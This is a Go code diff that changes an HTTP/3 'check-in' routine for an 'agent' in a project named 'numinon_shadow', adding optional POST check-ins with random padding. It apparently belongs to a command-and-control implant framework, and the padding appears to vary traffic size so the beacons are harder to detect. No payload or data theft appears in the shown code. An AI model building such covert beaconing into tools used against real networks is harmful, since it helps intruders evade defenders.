@@ -3,6 +3,7 @@ package comm
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"github.com/quic-go/quic-go"
 	"github.com/quic-go/quic-go/http3"
@@ -11,6 +12,9 @@ import (
 	"net/http"
 	"net/url"
 	"numinon_shadow/internal/agent/config"
+	"numinon_shadow/internal/agent/utils"
+	"numinon_shadow/internal/models"
+	"strings"
 )
 
 var _ Communicator = (*Http3Communicator)(nil)
@@ -44,7 +48,7 @@ func NewHttp3Communicator(cfg config.AgentConfig) (*Http3Communicator, error) {
 	// It is a long-lived object that manages connections.
 	transport := &http3.Transport{
 		TLSClientConfig: tlsConfig,
-		QUICConfig:      &quic.Config{
+		QUICConfig: &quic.Config{
 			// Optional: Add QUIC-specific config if needed.
 			// For example, to increase idle timeout:
 			// MaxIdleTimeout: 60 * time.Second,
@@ -99,13 +103,43 @@ func (c *Http3Communicator) CheckIn() ([]byte, error) {
 	// CREATE THE REQUEST
 	var req *http.Request
 	var err error
-	log.Printf("|COMM %s|-> Checking in via GET to %s", c.agentConfig.Protocol, fullURL)
 
-	req, err = http.NewRequest(http.MethodGet, fullURL, nil)
+	// --- Conditional GET vs POST ---
+	if strings.ToUpper(c.agentConfig.CheckinMethod) == "POST" {
+		log.Printf("|COMM %s|-> Checking in via POST to %s", c.Type(), fullURL)
+
+		payloadPadding, err := utils.GenerateRandomPadding(c.agentConfig.MinPaddingBytes, c.agentConfig.MaxPaddingBytes)
+
+		if err != nil {
+			return nil, err
+		}
+
+		if c.agentConfig.EnablePadding && c.agentConfig.MaxPaddingBytes > 0 {
+			checkinPayload := models.AgentCheckIn{
+				Padding: payloadPadding,
+			}
+			log.Printf("|COMM %s|-> Added padding (SIZE: %d bytes) to POST check-in.", c.Type(), len(payloadPadding))
+
+			bodyBytes, marshalErr := json.Marshal(checkinPayload)
+			if marshalErr != nil {
+				log.Printf("|❗ERR COMM %s| Failed to marshal POST check-in payload: %v", c.Type(), marshalErr)
+				return nil, fmt.Errorf("failed to marshal POST check-in payload: %w", marshalErr)
+			}
+
+			req, err = http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(bodyBytes))
+			if err == nil {
+				req.Header.Set("Content-Type", "application/json")
+			}
+		}
+
+	} else { // Default to GET
+		log.Printf("|COMM %s|-> Checking in via GET to %s", c.Type(), fullURL)
+		req, err = http.NewRequest(http.MethodGet, fullURL, nil)
+	}
 
 	if err != nil {
-		log.Printf("|❗ERR COMM %s| Failed to create check-in request: %v", c.agentConfig.Protocol, err)
-		return nil, fmt.Errorf("failed to create %s check-in request: %w", c.agentConfig.Protocol, err)
+		log.Printf("|❗ERR COMM %s| Failed to create check-in request: %v", c.Type(), err)
+		return nil, fmt.Errorf("failed to create %s check-in request: %w", c.Type(), err)
 	}
 
 	// SET HEADERS
